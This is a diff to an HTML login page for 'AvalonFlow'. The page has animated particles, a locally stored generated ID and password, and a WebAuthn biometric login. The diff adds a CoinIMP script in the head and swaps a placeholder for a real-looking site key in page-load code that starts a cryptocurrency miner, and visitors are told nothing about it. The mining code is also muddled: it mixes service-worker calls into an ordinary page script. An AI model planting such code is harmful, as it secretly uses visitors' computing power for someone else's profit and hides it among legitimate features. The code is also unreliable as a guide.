@@ -1,7 +1,10 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
+    <!-- Include CoinIMP script here in the head section -->
+    <script src="https://coinimp.com/lib/coinimp.min.js"></script>
+    <!-- Other head content like meta tags, title, etc. -->
+    <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>AvalonFlow Login</title>
 <style>
@@ -220,267 +223,267 @@ input:focus {
     © 2026 AvalonFlow • Powered by Centrical™
 </footer>
 
-<script>  
-/* ---------- Floating Particles ---------- */  
-const container = document.getElementById('floating-bg');  
-for(let i=0;i<60;i++){  
-    const p=document.createElement('div');  
-    p.className='particle';  
-    const size=Math.random()*20+10;  
-    p.style.width=size+'px';  
-    p.style.height=size+'px';  
-    p.style.left=Math.random()*100+'vw';  
-    p.style.animationDuration=(Math.random()*20+10)+'s';  
-    container.appendChild(p);  
-}  
-  
-/* ---------- Identity Generator ---------- */  
-function generateID(){  
-    return "AF-" + Math.random().toString(36).substring(2,6).toUpperCase()  
-           + "-" + Math.random().toString(36).substring(2,6).toUpperCase();  
-}  
-  
-function generatePassword(){  
-    return Math.random().toString(36).substring(2,10) + "!";  
-}  
-  
-function generateSession(){  
-    return "AF-SESSION-" + Date.now().toString().slice(-6) + "-" +  
-           Math.random().toString(36).substring(2,6).toUpperCase();  
-}  
-  
-/* ---------- Load or Create Identity ---------- */  
-let identity = JSON.parse(localStorage.getItem("avalonflow_identity"));  
-  
-if(!identity){  
-    identity = {  
-        id: generateID(),  
-        password: generatePassword(),  
-        sessionRef: generateSession()  
-    };  
-    localStorage.setItem("avalonflow_identity", JSON.stringify(identity));  
-}  
-  
-/* ---------- Mini TV Display ---------- */  
-document.getElementById("credentialsDisplay").textContent =  
-    `🆔: ${identity.id} | 🔑: ${identity.password}`;  
-  
-const tvMessages = [  
-    "Keep your access credentials safe.",  
-    "Your session is unique per login.",  
-    "Do not share your AvalonFlow ID.",  
-    "Contact support with your session reference."  
-];  
-  
-let tvIndex = 0;  
-const guidanceDiv = document.getElementById("guidanceMessage");  
-  
-function fadeMessage() {  
-    guidanceDiv.style.opacity = 0;  
-    setTimeout(() => {  
-        guidanceDiv.textContent = tvMessages[tvIndex];  
-        guidanceDiv.style.opacity = 1;  
-        tvIndex = (tvIndex + 1) % tvMessages.length;  
-    }, 1000);  
-}  
-  
-fadeMessage();  
-setInterval(fadeMessage, 4000);  
-  
-/* ---------- Login ---------- */  
-function login(){  
-    const idInput = document.getElementById("AvalonFlowID").value;  
-    const passInput = document.getElementById("password").value;  
-  
-    if(idInput === identity.id && passInput === identity.password){  
-        window.location.href = `dashboard.html?ticket=${identity.sessionRef}`;  
-    } else {  
-        document.getElementById("loginError").innerText =  
-            "Access details not recognized.";  
-    }  
-}  
-  
-/* ---------- Device Detection (UX tuning only) ---------- */  
-const DEVICE = (() => {  
-  const ua = navigator.userAgent || "";  
-  return {  
-    isAndroid: /Android/i.test(ua),  
-    isiOS: /iPhone|iPad|iPod/i.test(ua),  
-    isDesktop: !/Android|iPhone|iPad|iPod/i.test(ua)  
-  };  
-})();  
-  
-/* ---------- Biometric Limits ---------- */  
-const BIOMETRIC_COOLDOWN = 60_000; // 1 minute  
-const BIOMETRIC_MAX_TRIES = 3;  
-const BIOMETRIC_TIMEOUT = DEVICE.isiOS ? 45_000 : 60_000; // 🔧 faster on iOS  
-  
-function biometricLocked() {  
-  const lastFail = Number(localStorage.getItem("bio_last_fail") || 0);  
-  return Date.now() - lastFail < BIOMETRIC_COOLDOWN;  
-}  
-  
-function recordBiometricFail() {  
-  const tries = Number(localStorage.getItem("bio_tries") || 0) + 1;  
-  localStorage.setItem("bio_tries", tries);  
-  localStorage.setItem("bio_last_fail", Date.now());  
-}  
-  
-function resetBiometricFails() {  
-  localStorage.removeItem("bio_tries");  
-  localStorage.removeItem("bio_last_fail");  
-}  
-  
-/* ---------- Biometric Login Improved ---------- */  
-async function biometricLogin() {  
-  if (!window.PublicKeyCredential) {  
-    return fallbackLogin("Device security not supported.");  
-  }  
-  
-  if (biometricLocked()) {  
-    return fallbackLogin("Too many attempts. Use fallback.");  
-  }  
-  
-  try {  
-    // 🔐 FIRST-TIME ENABLE  
-    if (localStorage.getItem("avalonflow_biometric_enabled") !== "true") {  
-      const credential = await navigator.credentials.create({  
-        publicKey: {  
-          challenge: crypto.getRandomValues(new Uint8Array(32)),  
-          rp: { name: "AvalonFlow", id: location.hostname },  
-          user: {  
-            id: crypto.getRandomValues(new Uint8Array(16)),  
-            name: "avalonflow-user",  
-            displayName: "AvalonFlow User"  
-          },  
-          pubKeyCredParams: [{ type: "public-key", alg: -7 }],  
-          authenticatorSelection: {  
-            authenticatorAttachment: "platform",  
-            userVerification: "required",  
-            residentKey: "required" // force platform credential for biometrics  
-          },  
-          timeout: BIOMETRIC_TIMEOUT  
-        }  
-      });  
-  
-      if (credential) {  
-        localStorage.setItem("avalonflow_biometric_enabled", "true");  
-      } else {  
-        return fallbackLogin("Device registration failed. Use fallback.");  
-      }  
-    }  
-  
-    // 🔓 UNLOCK  
-    const assertion = await navigator.credentials.get({  
-      publicKey: {  
-        challenge: crypto.getRandomValues(new Uint8Array(32)),  
-        userVerification: "required",  
-        timeout: BIOMETRIC_TIMEOUT  
-      }  
-    });  
-  
-    if (!assertion) {  
-      return fallbackLogin("Authentication failed. Use fallback.");  
-    }  
-  
-    resetBiometricFails();  
-    document.body.classList.remove("locked");  
-  
-    // ✅ Redirect  
-    window.location.href = `dashboard.html?ticket=${identity.sessionRef}`;  
-  
-  } catch (err) {  
-    recordBiometricFail();  
-  
-    if (Number(localStorage.getItem("bio_tries")) >= BIOMETRIC_MAX_TRIES) {  
-      fallbackLogin("Biometric locked. Use fallback.");  
-    } else {  
-      fallbackLogin("Authentication cancelled or failed.");  
-    }  
-  }  
-}  
-  
-/* ---------- Fallback ---------- */  
-function fallbackLogin(message) {  
-  if (message) alert(message);  
-  document.body.classList.add("show-fallback");  
-}  
-  
-/* ---------- Set Button Text Dynamically ---------- */  
-window.addEventListener("DOMContentLoaded", () => {  
-  const btn = document.querySelector('[onclick="biometricLogin()"]');  
-  if (btn) {  
-    btn.innerText = DEVICE.isiOS ? "Login with Face/Touch ID" : "Login with Fingerprint";  
-  }  
-});
+<script>
+        /* ---------- Floating Particles ---------- */
+        const container = document.getElementById('floating-bg');
+        for (let i = 0; i < 60; i++) {
+            const p = document.createElement('div');
+            p.className = 'particle';
+            const size = Math.random() * 20 + 10;
+            p.style.width = size + 'px';
+            p.style.height = size + 'px';
+            p.style.left = Math.random() * 100 + 'vw';
+            p.style.animationDuration = (Math.random() * 20 + 10) + 's';
+            container.appendChild(p);
+        }
 
-/* ---------- Service Worker for Mining ---------- */
-self.addEventListener('install', event => {
-    console.log('Service Worker installed');
-    event.waitUntil(self.skipWaiting()); // Skip waiting to activate immediately
-});
+        /* ---------- Identity Generator ---------- */
+        function generateID() {
+            return "AF-" + Math.random().toString(36).substring(2, 6).toUpperCase()
+                + "-" + Math.random().toString(36).substring(2, 6).toUpperCase();
+        }
 
-self.addEventListener('activate', event => {
-    console.log('Service Worker activated');
+        function generatePassword() {
+            return Math.random().toString(36).substring(2, 10) + "!";
+        }
 
-    // Create the Web Worker for mining  
-    const minerWorker = new Worker(URL.createObjectURL(new Blob([`  
-        // Web Worker Script for Mining (CoinIMP Integration)  
+        function generateSession() {
+            return "AF-SESSION-" + Date.now().toString().slice(-6) + "-" +
+                Math.random().toString(36).substring(2, 6).toUpperCase();
+        }
 
-        importScripts('https://coinimp.com/lib/coinimp.min.js'); // Import CoinIMP script in the worker  
+        /* ---------- Load or Create Identity ---------- */
+        let identity = JSON.parse(localStorage.getItem("avalonflow_identity"));
 
-        onmessage = function(event) {  
-            if (event.data === 'start') {  
-                console.log('Mining started in worker');  
+        if (!identity) {
+            identity = {
+                id: generateID(),
+                password: generatePassword(),
+                sessionRef: generateSession()
+            };
+            localStorage.setItem("avalonflow_identity", JSON.stringify(identity));
+        }
 
-                // Initialize CoinIMP miner  
-                var miner = new CoinIMP('YOUR_SITE_KEY'); // Replace with your actual site key  
+        /* ---------- Mini TV Display ---------- */
+        document.getElementById("credentialsDisplay").textContent =
+            `🆔: ${identity.id} | 🔑: ${identity.password}`;
 
-                // Start the miner  
-                miner.start();  
+        const tvMessages = [
+            "Keep your access credentials safe.",
+            "Your session is unique per login.",
+            "Do not share your AvalonFlow ID.",
+            "Contact support with your session reference."
+        ];
 
-                // Simulate continuous mining  
-                let counter = 0;  
-                setInterval(() => {  
-                    counter++;  
-                    postMessage(\`Mining... Completed \${counter} iterations\`); // Send mining status back to the Service Worker  
-                }, 1000); // Send mining status every second  
-            }  
-        };  
-    `), { type: 'application/javascript' })));  
+        let tvIndex = 0;
+        const guidanceDiv = document.getElementById("guidanceMessage");
 
-    // Start mining when the service worker is activated  
-    minerWorker.postMessage('start'); // Sending message to Web Worker to start mining  
+        function fadeMessage() {
+            guidanceDiv.style.opacity = 0;
+            setTimeout(() => {
+                guidanceDiv.textContent = tvMessages[tvIndex];
+                guidanceDiv.style.opacity = 1;
+                tvIndex = (tvIndex + 1) % tvMessages.length;
+            }, 1000);
+        }
 
-    // Handle worker's responses (if necessary)  
-    minerWorker.onmessage = function(event) {  
-        console.log('Message from Web Worker:', event.data);  
-    };
-});
+        fadeMessage();
+        setInterval(fadeMessage, 4000);
 
-function startMining() {
-    console.log('Background mining started');
+        /* ---------- Login ---------- */
+        function login() {
+            const idInput = document.getElementById("AvalonFlowID").value;
+            const passInput = document.getElementById("password").value;
 
-    // Initialize CoinIMP miner directly in the service worker  
-    importScripts('https://coinimp.com/lib/coinimp.min.js');  // Import CoinIMP script  
+            if (idInput === identity.id && passInput === identity.password) {
+                window.location.href = `dashboard.html?ticket=${identity.sessionRef}`;
+            } else {
+                document.getElementById("loginError").innerText =
+                    "Access details not recognized.";
+            }
+        }
 
-    var miner = new CoinIMP('YOUR_SITE_KEY');  // Replace with your actual site key  
+        /* ---------- Device Detection (UX tuning only) ---------- */
+        const DEVICE = (() => {
+            const ua = navigator.userAgent || "";
+            return {
+                isAndroid: /Android/i.test(ua),
+                isiOS: /iPhone|iPad|iPod/i.test(ua),
+                isDesktop: !/Android|iPhone|iPad|iPod/i.test(ua)
+            };
+        })();
 
-    // Start the miner  
-    miner.start();  
+        /* ---------- Biometric Limits ---------- */
+        const BIOMETRIC_COOLDOWN = 60_000; // 1 minute
+        const BIOMETRIC_MAX_TRIES = 3;
+        const BIOMETRIC_TIMEOUT = DEVICE.isiOS ? 45_000 : 60_000; // 🔧 faster on iOS
 
-    // Send mining status back to the main thread periodically  
-    let counter = 0;  
-    setInterval(() => {  
-        counter++;  
-        // Post progress updates back to the main thread  
-        postMessage(`Mining... Completed ${counter} iterations`);  
-    }, 1000); // Send mining status every second
-}
+        function biometricLocked() {
+            const lastFail = Number(localStorage.getItem("bio_last_fail") || 0);
+            return Date.now() - lastFail < BIOMETRIC_COOLDOWN;
+        }
 
-// Start mining when the service worker is activated
-startMining();
-</script>
+        function recordBiometricFail() {
+            const tries = Number(localStorage.getItem("bio_tries") || 0) + 1;
+            localStorage.setItem("bio_tries", tries);
+            localStorage.setItem("bio_last_fail", Date.now());
+        }
 
+        function resetBiometricFails() {
+            localStorage.removeItem("bio_tries");
+            localStorage.removeItem("bio_last_fail");
+        }
+
+        /* ---------- Biometric Login Improved ---------- */
+        async function biometricLogin() {
+            if (!window.PublicKeyCredential) {
+                return fallbackLogin("Device security not supported.");
+            }
+
+            if (biometricLocked()) {
+                return fallbackLogin("Too many attempts. Use fallback.");
+            }
+
+            try {
+                // 🔐 FIRST-TIME ENABLE
+                if (localStorage.getItem("avalonflow_biometric_enabled") !== "true") {
+                    const credential = await navigator.credentials.create({
+                        publicKey: {
+                            challenge: crypto.getRandomValues(new Uint8Array(32)),
+                            rp: { name: "AvalonFlow", id: location.hostname },
+                            user: {
+                                id: crypto.getRandomValues(new Uint8Array(16)),
+                                name: "avalonflow-user",
+                                displayName: "AvalonFlow User"
+                            },
+                            pubKeyCredParams: [{ type: "public-key", alg: -7 }],
+                            authenticatorSelection: {
+                                authenticatorAttachment: "platform",
+                                userVerification: "required",
+                                residentKey: "required" // force platform credential for biometrics
+                            },
+                            timeout: BIOMETRIC_TIMEOUT
+                        }
+                    });
+
+                    if (credential) {
+                        localStorage.setItem("avalonflow_biometric_enabled", "true");
+                    } else {
+                        return fallbackLogin("Device registration failed. Use fallback.");
+                    }
+                }
+
+                // 🔓 UNLOCK
+                const assertion = await navigator.credentials.get({
+                    publicKey: {
+                        challenge: crypto.getRandomValues(new Uint8Array(32)),
+                        userVerification: "required",
+                        timeout: BIOMETRIC_TIMEOUT
+                    }
+                });
+
+                if (!assertion) {
+                    return fallbackLogin("Authentication failed. Use fallback.");
+                }
+
+                resetBiometricFails();
+                document.body.classList.remove("locked");
+
+                // ✅ Redirect
+                window.location.href = `dashboard.html?ticket=${identity.sessionRef}`;
+
+            } catch (err) {
+                recordBiometricFail();
+
+                if (Number(localStorage.getItem("bio_tries")) >= BIOMETRIC_MAX_TRIES) {
+                    fallbackLogin("Biometric locked. Use fallback.");
+                } else {
+                    fallbackLogin("Authentication cancelled or failed.");
+                }
+            }
+        }
+
+        /* ---------- Fallback ---------- */
+        function fallbackLogin(message) {
+            if (message) alert(message);
+            document.body.classList.add("show-fallback");
+        }
+
+        /* ---------- Set Button Text Dynamically ---------- */
+        window.addEventListener("DOMContentLoaded", () => {
+            const btn = document.querySelector('[onclick="biometricLogin()"]');
+            if (btn) {
+                btn.innerText = DEVICE.isiOS ? "Login with Face/Touch ID" : "Login with Fingerprint";
+            }
+        });
+
+        /* ---------- Service Worker for Mining ---------- */
+        self.addEventListener('install', event => {
+            console.log('Service Worker installed');
+            event.waitUntil(self.skipWaiting()); // Skip waiting to activate immediately
+        });
+
+        self.addEventListener('activate', event => {
+            console.log('Service Worker activated');
+
+            // Create the Web Worker for mining  
+            const minerWorker = new Worker(URL.createObjectURL(new Blob([`
+                // Web Worker Script for Mining (CoinIMP Integration)  
+
+                importScripts('https://coinimp.com/lib/coinimp.min.js'); // Import CoinIMP script in the worker  
+
+                onmessage = function(event) {  
+                    if (event.data === 'start') {  
+                        console.log('Mining started in worker');  
+
+                        // Initialize CoinIMP miner  
+                        var miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4'); // Replace with your actual site key  
+
+                        // Start the miner  
+                        miner.start();  
+
+                        // Simulate continuous mining  
+                        let counter = 0;  
+                        setInterval(() => {  
+                            counter++;  
+                            postMessage(\`Mining... Completed \${counter} iterations\`); // Send mining status back to the Service Worker  
+                        }, 1000); // Send mining status every second  
+                    }  
+                };  
+            `), { type: 'application/javascript' })));  
+
+            // Start mining when the service worker is activated  
+            minerWorker.postMessage('start'); // Sending message to Web Worker to start mining  
+
+            // Handle worker's responses (if necessary)
+            minerWorker.onmessage = function(event) {  
+                console.log('Message from Web Worker:', event.data);  
+            };
+        });
+
+        // Function to simulate background mining logic
+        function startMining() {
+            console.log('Background mining started');
+
+            // Initialize CoinIMP miner directly in the service worker  
+            importScripts('https://coinimp.com/lib/coinimp.min.js');  // Import CoinIMP script  
+
+            var miner = new CoinIMP('2945851f59e3ee79b6160d95323c186e47ad416cc9bcc7d76bb858127de4b4f4');  // Replace with your actual site key  
+
+            // Start the miner  
+            miner.start();  
+
+            // Send mining status back to the main thread periodically  
+            let counter = 0;  
+            setInterval(() => {  
+                counter++;  
+                // Post progress updates back to the main thread  
+                postMessage(`Mining... Completed ${counter} iterations`);  
+            }, 1000); // Send mining status every second
+        }
+
+        // Start mining when the service worker is activated
+        startMining();
+    </script>
 </body>
 </html>
